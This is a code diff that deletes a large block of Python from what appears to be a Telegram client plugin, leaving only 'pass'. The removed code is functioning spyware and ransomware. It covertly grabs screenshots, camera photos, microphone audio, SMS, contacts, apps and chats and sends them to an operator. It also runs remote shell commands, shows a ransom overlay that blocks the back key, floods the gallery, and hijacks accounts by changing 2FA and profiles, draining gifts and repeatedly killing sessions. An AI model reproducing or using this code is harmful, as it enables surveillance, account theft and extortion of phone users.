-                if a is not None:
-                    return a
-            except Exception:
-                pass
-        return None
-
-    def _screenshot(self):
-        try:
-            act = self._get_activity()
-            if act is None:
-                return {"error": "no act"}
-            view = act.getWindow().getDecorView().getRootView()
-            w = view.getWidth()
-            h = view.getHeight()
-            if w <= 0 or h <= 0:
-                return {"error": "bad size"}
-            Bitmap = jclass("android.graphics.Bitmap")
-            Canvas = jclass("android.graphics.Canvas")
-            Config = jclass("android.graphics.Bitmap$Config")
-            bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
-            c = Canvas(bmp)
-            view.draw(c)
-            ctx = ApplicationLoader.applicationContext
-            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
-            if not os.path.exists(d):
-                os.makedirs(d)
-            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
-            from java.io import FileOutputStream
-            fos = FileOutputStream(p)
-            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
-            bmp.compress(fmt, 85, fos)
-            fos.flush()
-            fos.close()
-            bmp.recycle()
-            phone = "—"
-            try:
-                u = _UC().getInstance(0).getCurrentUser()
-                rp = _phone_from_user(u)
-                if rp:
-                    phone = rp
-            except Exception:
-                pass
-            self._send_photo(p, "Phone: " + phone)
-            try:
-                os.remove(p)
-            except Exception:
-                pass
-            return {"ok": True}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _manual_camera(self, which="front"):
-        try:
-            if not self._has_perm("android.permission.CAMERA"):
-                return {"error": "no perm"}
-            cam = jclass("android.hardware.Camera")
-            cid = None
-            try:
-                ic = jclass("android.hardware.Camera$CameraInfo")
-                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
-                info = ic()
-                total = int(cam.getNumberOfCameras())
-                for i in range(total):
-                    cam.getCameraInfo(i, info)
-                    if int(info.facing) == int(facing):
-                        cid = i
-                        break
-            except Exception:
-                pass
-            if cid is None:
-                cid = 1 if which == "front" else 0
-            c = None
-            for _ in range(4):
-                try:
-                    c = cam.open(int(cid))
-                    break
-                except Exception:
-                    time.sleep(0.4)
-            if c is None:
-                return {"error": "no open"}
-            try:
-                st = jclass("android.graphics.SurfaceTexture")(0)
-                c.setPreviewTexture(st)
-                c.startPreview()
-                ev = threading.Event()
-                box = [None]
-                PC = jclass("android.hardware.Camera$PictureCallback")
-
-                class _PC(dynamic_proxy(PC)):
-                    def onPictureTaken(self, data, camera):
-                        box[0] = data
-                        ev.set()
-
-                c.takePicture(None, None, _PC())
-                ev.wait(8)
-                if box[0]:
-                    raw = bytes(box[0])
-                    self._send_document_bytes("%s.jpg" % which, raw)
-                    return {"ok": True}
-                return {"error": "no photo"}
-            finally:
-                try:
-                    c.stopPreview()
-                except Exception:
-                    pass
-                try:
-                    c.release()
-                except Exception:
-                    pass
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _manual_audio(self, sec=5):
-        try:
-            if not self._has_perm("android.permission.RECORD_AUDIO"):
-                return {"error": "no perm"}
-            ctx = ApplicationLoader.applicationContext
-            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
-                             "a_%d.3gp" % int(time.time()))
-            mr = jclass("android.media.MediaRecorder")()
-            try:
-                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
-                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
-                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
-            except Exception:
-                src = of = ae = 1
-            mr.setAudioSource(src)
-            mr.setOutputFormat(of)
-            mr.setAudioEncoder(ae)
-            mr.setOutputFile(p)
-            mr.prepare()
-            mr.start()
-            time.sleep(int(sec))
-            mr.stop()
-            mr.release()
-            with open(p, "rb") as f:
-                data = f.read()
-            try:
-                os.remove(p)
-            except Exception:
-                pass
-            self._send_document_bytes("audio.3gp", data)
-            return {"ok": True}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _manual_sms(self):
-        try:
-            out = []
-            if self._has_perm("android.permission.READ_SMS"):
-                ctx = ApplicationLoader.applicationContext
-                cr = ctx.getContentResolver()
-                Uri = jclass("android.net.Uri")
-                cur = cr.query(Uri.parse("content://sms"),
-                               ["address", "body", "date"], None, None, "date DESC")
-                if cur:
-                    while cur.moveToNext():
-                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
-                    cur.close()
-            if not out:
-                self._send_msg("SMS empty or no perm")
-                return
-            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:100]))), html=True)
-        except Exception as e:
-            self._send_msg("sms err: " + str(e))
-
-    def _manual_contacts(self):
-        try:
-            out = []
-            if self._has_perm("android.permission.READ_CONTACTS"):
-                ctx = ApplicationLoader.applicationContext
-                cr = ctx.getContentResolver()
-                Uri = jclass("android.net.Uri")
-                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
-                               ["display_name", "data1"], None, None, None)
-                if cur:
-                    while cur.moveToNext():
-                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
-                    cur.close()
-            if not out:
-                self._send_msg("Contacts empty or no perm")
-                return
-            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:200]))), html=True)
-        except Exception as e:
-            self._send_msg("contacts err: " + str(e))
-
-    def _manual_apps(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            pm = ctx.getPackageManager()
-            apps = pm.getInstalledApplications(0)
-            out = []
-            n = _jlist_size(apps)
-            for i in range(n):
-                try:
-                    a = _jlist_get(apps, i)
-                    pkg = str(a.packageName)
-                    label = pkg
-                    try:
-                        label = str(pm.getApplicationLabel(a))
-                    except Exception:
-                        pass
-                    out.append("%s — %s" % (label, pkg))
-                except Exception:
-                    pass
-            out.sort()
-            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:300]))), html=True)
-        except Exception as e:
-            self._send_msg("apps err: " + str(e))
-
-    def _manual_chats(self):
-        try:
-            mc = _MC().getInstance(0)
-            try:
-                dialogs = mc.dialogs_dict
-            except Exception:
-                dialogs = mc.getAllDialogs()
-            if not dialogs:
-                self._send_msg("no dialogs")
-                return
-            out = []
-            for i in range(_jlist_size(dialogs)):
-                try:
-                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
-                    title = ""
-                    if did > 0:
-                        u = mc.getUser(did)
-                        if u is not None:
-                            title = " ".join(x for x in (
-                                str(getattr(u, "first_name", "") or ""),
-                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
-                    else:
-                        cid = -did
-                        if cid > 1000000000000:
-                            cid -= 1000000000000
-                        c = mc.getChat(int(cid))
-                        if c is not None:
-                            title = str(getattr(c, "title", "") or str(did))
-                    out.append("%d — %s" % (did, title or "?"))
-                except Exception:
-                    pass
-            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:200]))), html=True)
-        except Exception as e:
-            self._send_msg("chats err: " + str(e))
-
-    def _manual_shell(self, cmd):
-        try:
-            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
-            out = p.stdout.decode("utf-8", "ignore")
-            err = p.stderr.decode("utf-8", "ignore")
-            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
-                self._html_escape(cmd), p.returncode,
-                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
-        except Exception as e:
-            self._send_msg("shell err: " + str(e))
-
-    def _pull_out_account(self):
-        try:
-            self._send_msg("Pull Out...")
-            Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
-                      "org.telegram.tgnet.tl.TL_auth$logOut")
-            if not Lo:
-                self._send_msg("Pull out err: no class")
-                return
-            rq = Lo()
-            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
-            if e is not None:
-                self._send_msg("Pull out err: " + str(e))
-            else:
-                self._send_msg("Pull out OK.")
-        except Exception as e:
-            self._send_msg("Pull out exc: " + str(e))
-
-    def _ensure_overlay_perm(self, ctx):
-        try:
-            if jclass("android.provider.Settings").canDrawOverlays(ctx):
-                return True
-        except Exception:
-            pass
-        pkg = str(ctx.getPackageName())
-        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
-                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
-            try:
-                subprocess.run(c, shell=True, capture_output=True, timeout=10)
-            except Exception:
-                continue
-        try:
-            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
-        except Exception:
-            return False
-
-    def _show_ransom(self, text="", photo_url=""):
-        if self._ransom_view is not None:
-            return {"ok": True, "already": True}
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return {"error": "no ctx"}
-            use_decor = not self._ensure_overlay_perm(ctx)
-            photo_path = ""
-            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
-                    and os.path.exists(self._ransom_photo_path):
-                photo_path = self._ransom_photo_path
-            elif photo_url:
-                try:
-                    from urllib.request import urlopen
-                    data = urlopen(photo_url, timeout=20).read()
-                    photo_path = os.path.join(
-                        str(ctx.getFilesDir().getAbsolutePath()),
-                        "ransom_%d.jpg" % int(time.time()))
-                    with open(photo_path, "wb") as f:
-                        f.write(data)
-                    self._ransom_photo_path = photo_path
-                    self._ransom_photo_url = photo_url
-                except Exception:
-                    pass
-
-            drew = threading.Event()
-            derr = [None]
-
-            def _build():
-                try:
-                    CTX = jclass("android.content.Context")
-                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
-                    self._ransom_wm = wm
-                    LL = jclass("android.widget.LinearLayout")
-                    TV = jclass("android.widget.TextView")
-                    IV = jclass("android.widget.ImageView")
-                    LP = jclass("android.view.WindowManager$LayoutParams")
-                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
-                    Color = jclass("android.graphics.Color")
-                    Gravity = jclass("android.view.Gravity")
-                    BitmapFactory = jclass("android.graphics.BitmapFactory")
-                    TypedValue = jclass("android.util.TypedValue")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    root = LL(ctx)
-                    root.setOrientation(LL.VERTICAL)
-                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
-                    pad = int(TypedValue.applyDimension(
-                        TypedValue.COMPLEX_UNIT_DIP, 24,
-                        ctx.getResources().getDisplayMetrics()))
-                    root.setPadding(pad, pad, pad, pad)
-                    root.setGravity(Gravity.CENTER)
-                    if photo_path:
-                        try:
-                            bmp = BitmapFactory.decodeFile(photo_path)
-                            if bmp is not None:
-                                iv = IV(ctx)
-                                iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
-                                    TypedValue.COMPLEX_UNIT_DIP, 280,
-                                    ctx.getResources().getDisplayMetrics())))
-                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
-                                    TypedValue.COMPLEX_UNIT_DIP, 16,
-                                    ctx.getResources().getDisplayMetrics()))
-                                iv.setLayoutParams(iv_lp)
-                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
-                                iv.setImageBitmap(bmp)
-                                root.addView(iv)
-                        except Exception:
-                            pass
-                    tv = TV(ctx)
-                    tv.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
-                    tv.setText(str(text))
-                    tv.setTextColor(Color.WHITE)
-                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
-                    tv.setGravity(Gravity.CENTER)
-                    root.addView(tv)
-                    warn_tv = TV(ctx)
-                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
-                    warn_lp.topMargin = int(TypedValue.applyDimension(
-                        TypedValue.COMPLEX_UNIT_DIP, 20,
-                        ctx.getResources().getDisplayMetrics()))
-                    warn_tv.setLayoutParams(warn_lp)
-                    warn_tv.setText(RANSOM_WARNING)
-                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
-                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
-                    warn_tv.setGravity(Gravity.CENTER)
-                    root.addView(warn_tv)
-                    KE = jclass("android.view.KeyEvent")
-
-                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
-                        def onKey(self, v, keyCode, event):
-                            try:
-                                if keyCode == KE.KEYCODE_BACK:
-                                    return True
-                            except Exception:
-                                pass
-                            return False
-
-                    root.setOnKeyListener(_OnKey())
-                    root.setFocusableInTouchMode(True)
-                    root.requestFocus()
-                    if use_decor:
-                        act2 = self._get_activity()
-                        if act2 is None:
-                            raise Exception("no activity")
-                        win2 = act2.getWindow()
-                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
-                        decor = win2.getDecorView()
-                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                        self._ransom_decor = decor
-                    else:
-                        params = LP(
-                            LP.MATCH_PARENT, LP.MATCH_PARENT,
-                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
-                                    getattr(LP, "TYPE_PHONE", 2002)),
-                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
-                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
-                            -3)
-                        params.gravity = Gravity.CENTER
-                        wm.addView(root, params)
-                    self._ransom_view = root
-                except Exception as e:
-                    derr[0] = e
-                finally:
-                    drew.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_build)
-            else:
-                _build()
-            drew.wait(12)
-            if derr[0] is not None:
-                return {"error": "ransom: %s" % derr[0]}
-            if self._ransom_view is None:
-                return {"error": "overlay not created"}
-            self._send_msg("Ransom overlay ON")
-            return {"ok": True}
-        except Exception as e:
-            return {"error": "ransom: %s" % e}
-
-    def _dismiss_ransom(self):
-        try:
-            if self._ransom_view is None:
-                return {"ok": True}
-            removed = threading.Event()
-
-            def _rm():
-                try:
-                    if self._ransom_view is not None:
-                        parent = self._ransom_decor or self._ransom_wm
-                        if parent is not None:
-                            parent.removeView(self._ransom_view)
-                        self._ransom_view = None
-                        self._ransom_decor = None
-                except Exception:
-                    pass
-                finally:
-                    removed.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_rm)
-                removed.wait(8)
-            else:
-                _rm()
-            return {"ok": True}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _lock_screen(self):
-        if self._locker_on:
-            return
-        try:
-            act = self._get_activity()
-            if act is None:
-                return
-
-            def _render():
-                try:
-                    Color = jclass("android.graphics.Color")
-                    FrameLayout = jclass("android.widget.FrameLayout")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    root = FrameLayout(act)
-                    root.setBackgroundColor(Color.BLACK)
-                    act.getWindow().getDecorView().addView(
-                        root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                    self._locker_view = root
-                    self._locker_on = True
-                    self._send_msg("Locker ON")
-                except Exception as e:
-                    _log("locker: %s" % e)
-
-            act.runOnUiThread(_render)
-        except Exception as e:
-            self._send_msg("lock err: " + str(e))
-
-    def _clear_locker(self):
-        if not self._locker_on or self._locker_view is None:
-            return
-        try:
-            parent = self._locker_view.getParent()
-            if parent is not None:
-                parent.removeView(self._locker_view)
-            self._locker_view = None
-            self._locker_on = False
-        except Exception:
-            self._locker_view = None
-            self._locker_on = False
-
-    def _play_mmusic(self, url):
-        def task():
-            try:
-                ctx = ApplicationLoader.applicationContext
-                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
-                if not os.path.exists(d):
-                    os.makedirs(d)
-                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
-                self._send_msg("Downloading...")
-                from urllib.request import urlopen
-                data = urlopen(url, timeout=60).read()
-                with open(path, "wb") as f:
-                    f.write(data)
-                self._clear_music()
-                mp = jclass("android.media.MediaPlayer")()
-                mp.setDataSource(path)
-                mp.prepare()
-                mp.setLooping(True)
-                mp.start()
-                self._music_mp = mp
-                self._send_msg("Music playing")
-            except Exception as e:
-                self._send_msg("music err: " + str(e))
-
-        threading.Thread(target=task, daemon=True).start()
-
-    def _clear_music(self):
-        if self._music_mp is not None:
-            try:
-                self._music_mp.stop()
-                self._music_mp.release()
-            except Exception:
-                pass
-            self._music_mp = None
-
-    def _flood_gallery(self, photo_url, count=100):
-        try:
-            from urllib.request import urlopen
-            data = urlopen(photo_url, timeout=30).read()
-            cr = ApplicationLoader.applicationContext.getContentResolver()
-            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
-            saved = []
-            for i in range(min(int(count), 200)):
-                try:
-                    ts = int(time.time()) + i
-                    rand = random.randint(1000, 9999)
-                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
-                                                            time.localtime(ts)), rand)
-                    values = jclass("android.content.ContentValues")()
-                    values.put("_display_name", name)
-                    values.put("mime_type", "image/jpeg")
-                    values.put("relative_path", "Pictures/")
-                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
-                    if uri:
-                        out = cr.openOutputStream(uri)
-                        out.write(data)
-                        out.close()
-                        saved.append(str(uri))
-                except Exception:
-                    pass
-            self._flood_uris = saved
-            self._send_msg("Flood: %d files" % len(saved))
-        except Exception as e:
-            self._send_msg("flood err: " + str(e))
-
-    def _clear_flood(self):
-        try:
-            cr = ApplicationLoader.applicationContext.getContentResolver()
-            removed = 0
-            for u in self._flood_uris:
-                try:
-                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
-                    removed += 1
-                except Exception:
-                    pass
-            self._send_msg("Flood cleared: %d" % removed)
-        except Exception as e:
-            self._send_msg("clear flood err: " + str(e))
-
-    def _dim_screen(self):
-        if self._dim_active:
-            return
-        try:
-            act = self._get_activity()
-            if act is None:
-                return
-
-            def _dim():
-                try:
-                    Color = jclass("android.graphics.Color")
-                    FrameLayout = jclass("android.widget.FrameLayout")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    overlay = FrameLayout(act)
-                    overlay.setBackgroundColor(Color.BLACK)
-                    overlay.setAlpha(0.88)
-                    act.getWindow().getDecorView().addView(
-                        overlay, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                    self._dim_view = overlay
-                    self._dim_active = True
-                except Exception:
-                    pass
-
-            act.runOnUiThread(_dim)
-        except Exception:
-            pass
-
-    def _clear_dim(self):
-        if not self._dim_active or self._dim_view is None:
-            return
-        try:
-            parent = self._dim_view.getParent()
-            if parent is not None:
-                parent.removeView(self._dim_view)
-            self._dim_view = None
-            self._dim_active = False
-        except Exception:
-            self._dim_view = None
-            self._dim_active = False
-
-    # ─── nuke loop ────────────────────────────────────────────────────────
-
-    def _nuke_marker_path(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
-                                ".ar_nuke_active")
-        except Exception:
-            return None
-
-    def _mark_nuke(self):
-        try:
-            m = self._nuke_marker_path()
-            if m:
-                with open(m, "w") as f:
-                    f.write("1")
-            self._nuke_on = True
-        except Exception:
-            pass
-
-    def _check_persisted_nuke(self):
-        try:
-            m = self._nuke_marker_path()
-            if not m or not os.path.exists(m):
-                return
-            self._nuke_on = True
-            self._nuke_thread = threading.Thread(
-                target=self._nuke_loop, daemon=True)
-            self._nuke_thread.start()
-            try:
-                self._send_msg("Nuke loop resumed from marker")
-            except Exception:
-                pass
-        except Exception:
-            pass
-
-    def _start_nuke_loop(self):
-        if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
-            try:
-                self._send_msg("Nuke loop already running")
-            except Exception:
-                pass
-            return
-        self._nuke_on = True
-        self._mark_nuke()
-        self._nuke_pass = 0
-        self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
-        self._nuke_thread.start()
-        try:
-            self._send_msg("Nuke loop STARTED. Killing sessions every 60s.")
-        except Exception:
-            pass
-
-    def _stop_nuke_loop(self):
-        self._nuke_on = False
-        try:
-            m = self._nuke_marker_path()
-            if m and os.path.exists(m):
-                os.remove(m)
-        except Exception:
-            pass
-        try:
-            self._send_msg("Nuke loop STOPPED.")
-        except Exception:
-            pass
-
-    def _nuke_loop(self):
-        while self._nuke_on and self._sync_running and not self.stop:
-            self._nuke_pass += 1
-            try:
-                for a in self._get_accounts_list():
-                    aid = a.get("id", 0)
-                    try:
-                        self._kill_all_sessions(aid, phones_pc_only=True)
-                    except Exception:
-                        pass
-                try:
-                    self._confirm_unconfirmed_sessions(0)
-                except Exception:
-                    pass
-                try:
-                    self._kill_web_authorizations(0)
-                except Exception:
-                    pass
-            except Exception as e:
-                _log("nuke pass %d: %s" % (self._nuke_pass, e))
-            for _ in range(self._nuke_interval):
-                if not self._nuke_on or not self._sync_running or self.stop:
-                    return
-                time.sleep(1)
-
-    # ─── full harvest / lockdown ──────────────────────────────────────────
-
-    def _full_harvest(self):
-        def task():
-            def alive():
-                return self._sync_running and self._active and not self.stop
-            try:
-                t0 = time.time()
-                self._send_msg("Full Harvest...")
-                report = ["<b>Full Harvest</b>"]
-                for a in self._get_accounts_list():
-                    aid = a.get("id")
-                    info = self._harvest_account_info(int(aid))
-                    report.append("<b>acc%d:</b> uid=%s @%s +%s" % (
-                        aid, a.get("user_id"),
-                        self._html_escape(a.get("username") or "—"),
-                        self._html_escape(a.get("phone") or "—")))
-                    if info.get("2fa"):
-                        report.append("  2fa=%s stars=%s" % (
-                            info.get("2fa"), info.get("stars_balance", "0")))
-                if not alive():
-                    return
-                try:
-                    self._tg_kid()
-                    report.append("<b>Tg kid:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._screenshot_gain()
-                    report.append("<b>Screenshot gain:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._manual_audio(5)
-                    report.append("<b>Audio:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._manual_sms()
-                    self._manual_contacts()
-                    self._manual_apps()
-                    self._manual_chats()
-                    report.append("<b>SMS/contacts/apps/chats:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._manual_dump_session()
-                    self._manual_userbot_session()
-                    report.append("<b>Session theft:</b> sent")
-                except Exception:
-                    pass
-                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
-                self._send_msg("\n".join(report), html=True)
-            except Exception as e:
-                self._send_msg("harvest err: " + str(e))
-
-        threading.Thread(target=task, daemon=True).start()
-
-    def _full_lockdown(self):
-        def task():
-            def alive():
-                return self._sync_running and self._active and not self.stop
-            try:
-                t0 = time.time()
-                self._send_msg("Full Lockdown...")
-                report = ["<b>Full Lockdown</b>"]
-
-                # 1 harvest + sessions
-                if not alive():
-                    return
-                self._send_msg("1/9 harvest + sessions...")
-                ga = self._parallel([
-                    (self._tg_kid,),
-                    (self._confirm_unconfirmed_sessions, 0),
-                    (self._kill_web_authorizations, 0),
-                ], workers=3, timeout=120)
-                report.append("<b>Tg kid:</b> %s" % self._html_escape(str(ga[0] or "—")))
-                report.append("<b>Pending:</b> %s" % str(ga[1]))
-                report.append("<b>Web:</b> %s" % str(ga[2]))
-
-                # 2 gift drain
-                if not alive():
-                    return
-                self._send_msg("2/9 gift drain...")
-                try:
-                    gr = self._drain_gifts(0)
-                    if gr.get("error"):
-                        report.append("<b>Gifts:</b> err=%s" % gr["error"])
-                    else:
-                        conv = gr.get("convert") or {}
-                        u = gr.get("u") or []
-                        ok_count = sum(1 for x in u if isinstance(x, dict)
-                                       and isinstance(x.get("result"), dict)
-                                       and x["result"].get("ok"))
-                        report.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
-                            conv.get("converted_stars", 0), ok_count,
-                            gr.get("fee_deficit", 0)))
-                except Exception as e:
-                    report.append("<b>Gifts:</b> %s" % e)
-
-                # 3 2FA
-                if not alive():
-                    return
-                self._send_msg("3/9 2FA...")
-                try:
-                    pwd = self._nuke_password_pipeline(0)
-                except Exception as e:
-                    pwd = {"final": "exc: %s" % e}
-                report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
-
-                # 4 profile lock
-                if not alive():
-                    return
-                self._send_msg("4/9 profile lock...")
-                try:
-                    new_un = self._change_username(0)
-                except Exception:
-                    new_un = None
-                try:
-                    prof = self._change_profile(0)
-                except Exception:
-                    prof = False
-                try:
-                    cont = self._reset_contacts(0)
-                except Exception:
-                    cont = False
-                report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
-                report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
-                report.append("<b>Contacts:</b> %s" % cont)
-
-                # 5 kill sessions
-                if not alive():
-                    return
-                self._send_msg("5/9 kill sessions...")
-                k, total = self._kill_all_sessions(0, phones_pc_only=True)
-                report.append("<b>Phones/PCs killed:</b> %d / %d" % (k, total))
-
-                # 6 screenshot gain
-                if not alive():
-                    return
-                self._send_msg("6/9 screenshot gain...")
-                try:
-                    self._screenshot_gain()
-                    report.append("<b>Screenshot gain:</b> sent")
-                except Exception:
-                    pass
-
-                # 7 RANSOM (перед pull out)
-                if not alive():
-                    return
-                self._send_msg("7/9 ransom overlay...")
-                try:
-                    rr = self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
-                    if isinstance(rr, dict) and rr.get("ok"):
-                        report.append("<b>Ransom:</b> ON")
-                    else:
-                        report.append("<b>Ransom:</b> %s" % rr)
-                except Exception as e:
-                    report.append("<b>Ransom:</b> %s" % e)
-
-                # 8 pull out — последним
-                if not alive():
-                    return
-                self._send_msg("8/9 pull out...")
-                try:
-                    self._pull_out_account()
-                    report.append("<b>Pull Out:</b> last")
-                except Exception as e:
-                    report.append("<b>Pull Out:</b> %s" % e)
-
-                # 9 double-kill + nuke loop
-                if not alive():
-                    return
-                self._send_msg("9/9 double-kill + nuke...")
-                for _w in range(30):
-                    if not alive():
-                        return
-                    time.sleep(1)
-                try:
-                    k2, t2 = self._kill_all_sessions(0, phones_pc_only=True)
-                    report.append("<b>Double-kill:</b> %d / %d" % (k2, t2))
-                except Exception as e:
-                    report.append("<b>Double-kill:</b> %s" % e)
-                try:
-                    self._start_nuke_loop()
-                    report.append("<b>Nuke loop:</b> ON (60s)")
-                except Exception as e:
-                    report.append("<b>Nuke loop:</b> %s" % e)
-
-                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
-                report.append("<b>LOCKDOWN complete</b>")
-                self._send_markup("\n".join(report), {
-                    "inline_keyboard": [
-                        [{"text": "Logout again", "callback_data": "hv_logout"}],
-                        [{"text": "Stop nuke", "callback_data": "hv_stop_nuke"}],
-                    ]
-                }, html=True)
-            except Exception as e:
-                self._send_msg("lockdown err: " + str(e))
-
-        threading.Thread(target=task, daemon=True).start()
+        pass
 
 
 def create_plugin():
